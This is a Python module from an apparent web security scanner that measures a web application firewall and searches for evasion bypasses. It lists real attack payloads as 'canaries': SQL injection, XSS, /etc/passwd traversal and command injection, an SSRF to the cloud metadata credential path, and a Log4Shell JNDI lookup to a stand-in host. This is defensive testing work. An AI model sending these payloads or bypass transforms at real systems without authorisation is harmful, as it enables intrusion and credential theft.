"""WAF effectiveness audit. CWE-693 (Protection Mechanism Failure) / OWASP A05:2021.

Turns dastcore into a WAF-assessment tool: instead of (only) testing the app, it measures the WAF in
front of it. For each vulnerability family it sends a **harmless canary** — a payload that trips WAF
signatures but injects nothing (it goes to a benign parameter the app need not even use; a WAF matches
on the request, not on the app's behaviour) — and records whether the WAF **blocks** it. For every
blocked family it then replays the canary through the evasion transforms (:mod:`dastcore.engine.waf`)
and records which one **slips past**.

The result is a factual coverage matrix — vendor, which families are blocked, which pass unfiltered, and
which blocks are bypassable — reported as one advisory finding. It states *observed* behaviour (a
block-vs-pass differential against a benign baseline), never a vulnerability inference, so it is
false-positive-free. Opt-in via ``--waf-audit`` (it sends deliberately malicious-looking requests).
"""

from __future__ import annotations

import re
from urllib.parse import urlencode, urlsplit, urlunsplit

import httpx

from dastcore.core.http_client import BudgetExceededError, HttpClient, OutOfScopeError
from dastcore.core.models import Evidence, Finding, HttpRequest, HttpResponse, InjectionPoint
from dastcore.engine.waf import tampered_variants

_BENIGN = "dcwafaudit-benign-0k"

# (family, canary). The canary trips a signature for that family but performs no injection.
_CANARIES: tuple[tuple[str, str], ...] = (
    ("sqli", "1' OR '1'='1' UNION SELECT NULL,NULL-- -"),
    ("xss", "<script>alert(document.domain)</script>"),
    ("lfi", "../../../../../../etc/passwd"),
    ("cmdi", "; cat /etc/passwd"),
    ("ssrf", "http://169.254.169.254/latest/meta-data/iam/"),
    ("ssti", "${{7*7}}"),
    ("log4shell", "${jndi:ldap://dcwafaudit.example/x}"),
)

_BLOCK_STATUSES = {403, 406, 409, 429, 501, 503}
_BLOCK_SIGN = re.compile(
    r"attention required|access denied|request (?:was )?(?:blocked|rejected|denied)|web application "
    r"firewall|forbidden|incident id|not acceptable|unusual traffic|are you a human|captcha|"
    r"has been blocked|malicious|security policy|blocked by",
    re.IGNORECASE,
)


async def _get(client: HttpClient, url: str) -> HttpResponse | None:
    try:
        return await client.request("GET", url)
    except (OutOfScopeError, BudgetExceededError, httpx.HTTPError):
        return None


def _url_with_q(base_url: str, value: str) -> str:
    parts = urlsplit(base_url)
    query = (parts.query + "&" if parts.query else "") + urlencode([("q", value)])
    return urlunsplit((parts.scheme, parts.netloc, parts.path or "/", query, ""))


def _is_blocked(response: HttpResponse | None, baseline_text: str) -> bool:
    """A response is a WAF block if the connection was dropped, the status is a block code, or the body
    carries a block-page signature the benign baseline did not."""
    if response is None:
        return True  # the WAF reset/dropped the connection
    if response.status_code in _BLOCK_STATUSES:
        return True
    return bool(_BLOCK_SIGN.search(response.text) and not _BLOCK_SIGN.search(baseline_text))


def _finding(root_url: str, vendor: str, results: list[tuple[str, bool, str | None]]) -> Finding:
    blocked = [f for f, b, _ in results if b]
    passed = [f for f, b, _ in results if not b]
    bypassed = [(f, n) for f, b, n in results if b and n]
    gaps = bool(passed or bypassed)

    parts = [
        f"WAF: {vendor or 'no identificado'}.",
        f"Bloquea ({len(blocked)}): {', '.join(blocked) or '—'}.",
        f"Deja pasar sin filtrar ({len(passed)}): {', '.join(passed) or '—'}.",
    ]
    if bypassed:
        parts.append("Bypasses: " + "; ".join(f"{f} vía {n}" for f, n in bypassed) + ".")
    summary = " ".join(parts)

    request = HttpRequest(method="GET", url=root_url)
    return Finding(
        id=f"waf-audit:{urlsplit(root_url).netloc}",
        rule_id="waf-audit",
        name="Auditoría de efectividad del WAF",
        severity="low" if gaps else "info",
        cwe="CWE-693",
        owasp="A05:2021",
        family="waf",
        injection_point=InjectionPoint(location="query", name="q", base_value="", request_template=request),
        evidence=[Evidence(type="differential", data=summary, confidence="high")],
        request=request,
        response=HttpResponse(status_code=200, text=""),
        impact=(
            "Las familias que el WAF deja pasar o cuyo bloqueo es evadible no están protegidas por él: "
            "trátalas como si no hubiera WAF y corrige la causa raíz en la aplicación."
            if gaps
            else "El WAF bloqueó todas las familias probadas y ningún bypass funcionó en esta prueba."
        ),
        remediation=(
            "No confíes en el WAF como único control: corrige las vulnerabilidades en la aplicación. "
            "Endurece las reglas del WAF para las familias que deja pasar y normaliza la entrada "
            "(decodificación recursiva, comentarios, espacios alternativos) antes de aplicar las firmas."
        ),
    )


async def run_waf_audit(
    client: HttpClient, root_url: str, *, waf_vendor: str = "", hints_out: dict[str, str] | None = None
) -> list[Finding]:
    """Send inert canaries per family, measure block-vs-pass, and probe evasions for blocked families.

    When ``hints_out`` is given, it is filled with ``{family: tamper_name}`` for each family whose block
    a tamper bypassed — the scanner can then try that tamper first during the active WAF-evasion scan
    (the names match :func:`dastcore.engine.waf.tampered_variants`)."""
    baseline = await _get(client, _url_with_q(root_url, _BENIGN))
    if baseline is None or baseline.status_code in _BLOCK_STATUSES:
        return []  # the baseline itself is blocked -> can't run a clean differential
    baseline_text = baseline.text

    results: list[tuple[str, bool, str | None]] = []
    for family, canary in _CANARIES:
        response = await _get(client, _url_with_q(root_url, canary))
        if not _is_blocked(response, baseline_text):
            results.append((family, False, None))
            continue
        bypass: str | None = None
        for name, tampered in tampered_variants(canary, family):
            evaded = await _get(client, _url_with_q(root_url, tampered))
            if not _is_blocked(evaded, baseline_text):
                bypass = name
                break
        results.append((family, True, bypass))

    if hints_out is not None:
        hints_out.update({family: name for family, blocked, name in results if blocked and name})
    return [_finding(root_url, waf_vendor, results)]
